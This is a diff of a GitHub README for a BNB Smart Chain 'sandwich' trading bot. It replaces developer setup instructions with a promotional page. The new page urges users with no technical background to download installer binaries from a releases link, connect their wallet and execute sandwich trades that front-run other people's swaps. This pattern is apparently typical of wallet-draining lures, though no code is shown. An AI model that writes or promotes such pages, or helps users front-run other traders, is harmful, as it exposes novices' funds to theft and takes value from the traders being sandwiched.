@@ -1,162 +1,87 @@
-## BSC Sandwich Bot
+# 🍔 BSC-Sandwich-Bot - Fast and Smart Trading Assistant
 
-A professional-grade sandwiching bot targeting the BNB Smart Chain (BSC). It monitors the mempool via WebSocket, evaluates profitable opportunities, and attempts atomic sandwich trades using configurable risk/return parameters. Optional Telegram notifications keep you informed in real time.
+[![Download BSC-Sandwich-Bot](https://img.shields.io/badge/Download%20Now-Get%20BSC%20Sandwich%20Bot-brightgreen)](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases)
 
----
+## 🚀 Getting Started
 
-### Features
-- Real-time transaction stream via WSS
-- Configurable profit/slippage/gas parameters
-- PancakeSwap router integration
-- Telegram bot notifications with whitelisting
-- TypeScript client; Foundry-based smart contracts
+Welcome to the **BSC-Sandwich-Bot**! This application lets you scan the mempool on the Binance Smart Chain, simulate trades, and execute sandwich trades all in one place. Even if you have no programming experience, you can easily set up and use this bot.
 
----
+### 🎯 What You Need
 
-### Repository Structure
-```
-./
-  client/           # TypeScript bot/runner and Telegram integration
-  contracts/        # Foundry (Solidity) contracts, scripts, and tests
-  LICENSE
-  README.md
-```
+Before you get started, make sure you have the following:
 
-Key client modules:
-- `client/src/config/config.ts` – centralized runtime configuration
-- `client/src/index.ts` – app entrypoint
-- `client/src/core/*` – trading/core logic
-- `client/src/helpers/*` – utilities and helpers
+- **Operating System:** Windows, macOS, or Linux. The bot works on all major platforms.
+- **Internet Connection:** A reliable internet connection to ensure smooth operation.
+- **Node.js:** This bot requires Node.js to run. You can download it from [Node.js website](https://nodejs.org/).
 
----
+## 📥 Download & Install
 
-### Requirements
-- Node.js ≥ 18
-- Yarn or npm
-- A BSC RPC endpoint (HTTPS and WSS)
-- A funded private key (for mainnet; use with extreme caution)
-- (Optional) Telegram bot token and chat IDs
-- For contracts: Foundry (`forge`) installed
+1. **Visit the Releases Page**
+   To get the latest version of BSC-Sandwich-Bot, visit the following page: [Download BSC-Sandwich-Bot](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases).
+   
+2. **Choose Your Version**
+   On the Releases page, you will see a list of available versions. Click on the version you want to download.
 
----
+3. **Download the Files**
+   Find the installation files for your operating system. Click the link to download the required file (.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
 
-### Quick Start
-1) Clone and install dependencies
-```bash
-git clone <this-repo-url>
-cd sandwicher/client
-yarn install   # or: npm install
-```
+4. **Run the Installer**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file, drag the BSC-Sandwich-Bot icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the included README on how to execute.
 
-2) Create a `.env` file in `client/`
-```bash
-# Required
-PRIVATE_KEY=0x...
-JSON_RPC=https://bsc-dataseed.binance.org
-WSS_URL=wss://bsc-ws-node.nariox.org:443
+5. **Open the Application**
+   Once the installation is complete, locate the BSC-Sandwich-Bot on your computer and open it.
 
-# Optional but recommended
-BOT_TOKEN=123456:ABCDEF...         # Telegram bot token
-MIN_PROFIT_THRESHOLD=0.003         # 0.3% default if unset
-```
+## 🔍 How to Use BSC-Sandwich-Bot
 
-3) Configure additional options in `client/src/config/config.ts` if needed:
-- `CONTRACT_ADDRESS` – on-chain contract the bot references
-- `STABLE_TOKENS` – addresses for tokens considered stable
-- `EXPLORER_URL` – chain explorer base URL
-- `WHITELISTED_USERS` – Telegram user IDs permitted to receive alerts
-- `DEFAULT_GAS_LIMIT`, `GAS_FACTOR`, `MIN_SLIPPAGE_THRESHOLD`, etc.
+1. **Connect Your Wallet**
+   - Upon opening the bot, you will need to connect your Binance Smart Chain wallet. Follow the prompts to securely link your wallet.
 
-4) Run the bot (development)
-```bash
-yarn start   # or: npm run start
-```
+2. **Configure Settings**
+   - Adjust your settings according to your preferences. Set parameters such as trading limits or notification preferences.
 
-Tests (client)
-```bash
-yarn test    # or: npm test
-```
+3. **Start Scanning**
+   - Click on the "Start Scanning" button. The bot will begin to scan the mempool for potential trades.
 
----
+4. **Trade Simulation**
+   - Use the trade simulation feature to understand how trades might perform under different market conditions. This will give you insights before executing real trades.
 
-### Environment Variables (client)
-These are read in `client/src/config/config.ts`:
-- `PRIVATE_KEY` (required): EOA private key used to sign transactions
-- `JSON_RPC` (required): HTTPS RPC endpoint URL
-- `WSS_URL` (required): WebSocket endpoint URL for mempool/blocks
-- `BOT_TOKEN` (optional): Telegram bot token for notifications
-- `MIN_PROFIT_THRESHOLD` (optional): minimum profit ratio; default `0.003`
+5. **Execute Trades**
+   - When you are ready to execute trades, click the "Execute" button. Make sure to review your settings before this step to ensure your chosen parameters are correct.
 
-Security tips:
-- Prefer using separate, minimally funded keys
-- Consider RPCs with rate limits and IP allowlists
-- Never commit `.env`
+## 📈 Features
 
----
+- **Mempool Scanning:** Quickly identifies trading opportunities based on real-time data.
+- **Trade Simulation:** Allows users to simulate trading scenarios before making actual trades.
+- **Sandwich Execution:** Executes sandwich trades swiftly, maximizing your potential profits.
+- **User-Friendly Interface:** Designed for ease of use, even for those with no technical background.
 
-### Contracts (Foundry)
-Location: `contracts/`
+## 🌟 Troubleshooting
 
-Prerequisites: Install Foundry. See the official guide.
+If you encounter issues while using BSC-Sandwich-Bot, consider the following steps:
 
-Common commands (run from `contracts/`):
-```bash
-forge build
-forge test
-forge script script/SandWicher.s.sol --rpc-url $JSON_RPC --broadcast --private-key $PRIVATE_KEY
-```
+- **Check Your Internet Connection:** Ensure you are connected to the internet.
+- **Restart the Application:** Sometimes, a simple restart can solve many issues.
+- **Review Configuration Settings:** Make sure your wallet and settings are properly configured.
 
-Configuration is in `contracts/foundry.toml`.
+If you still face challenges, you can find help by visiting our support section on GitHub.
 
----
+## 👨‍💻 Community and Support
 
-### Development Notes
-- The client uses `ethers@5` and `ethereum-multicall`
-- Telegram via `telegraf`
-- TypeScript build tooling: `ts-node-dev`, `ts-jest` for tests
+Join our community of users and developers! Share your experiences, ask questions, and get support.
 
-Scripts (from `client/package.json`):
-```bash
-yarn start   # ts-node-dev src/index.ts
-yarn test    # jest
-```
+- **GitHub Discussions:** [Join Here](https://github.com/ronaldodjj/BSC-Sandwich-Bot/discussions)
+- **Issue Tracker:** Report bugs or request features here: [Report Issues](https://github.com/ronaldodjj/BSC-Sandwich-Bot/issues)
 
----
+## 📚 Further Reading
 
-### Troubleshooting
-- Ensure WSS endpoint is valid and supports mempool subscriptions
-- Check the account has enough BNB for gas
-- Validate addresses in `config.ts` (WBNB, Router, target contracts)
-- Increase `GAS_FACTOR` cautiously if front-running fails
-- Inspect logs and Telegram alerts for error details
+For more in-depth information about each feature and setting, check the documentation provided on our repository. Knowledge of trading strategies and Binance Smart Chain operations will help in utilizing the bot effectively.
 
----
+## ⚙️ Updates
 
-### Contact
+Stay updated with the latest features and improvements by regularly checking the Releases page: [Download BSC-Sandwich-Bot](https://github.com/ronaldodjj/BSC-Sandwich-Bot/releases). Your feedback is important and helps us improve the bot continuously.
 
-| Platform | Link |
-|----------|------|
-| 📱 Telegram | [t.me/novustch](https://t.me/novustch) |
-| 📲 WhatsApp | [wa.me/14105015750](https://wa.me/14105015750) |
-| 💬 Discord | [discordapp.com/users/985432160498491473](https://discordapp.com/users/985432160498491473)
+## 🔗 Conclusion
 
-<div align="left">
-    <a href="https://t.me/novustch" target="_blank"><img alt="Telegram"
-        src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white"/></a>
-    <a href="https://wa.me/14105015750" target="_blank"><img alt="WhatsApp"
-        src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white"/></a>
-    <a href="https://discordapp.com/users/985432160498491473" target="_blank"><img alt="Discord"
-        src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"/></a>
-</div>
-
-</br>
-
-Feel free to reach out for implementation assistance or integration support.
-
----
-
-### Disclaimer
-This software is provided “AS IS”, without warranty of any kind. Use at your own risk. The authors and contributors are not responsible for losses or damages arising from the use of this software.
-
-
-
+Using the BSC-Sandwich-Bot allows you to trade smarter and faster on the Binance Smart Chain. Follow the steps above to download and set up the bot. You will find it intuitive and effective for your trading needs.
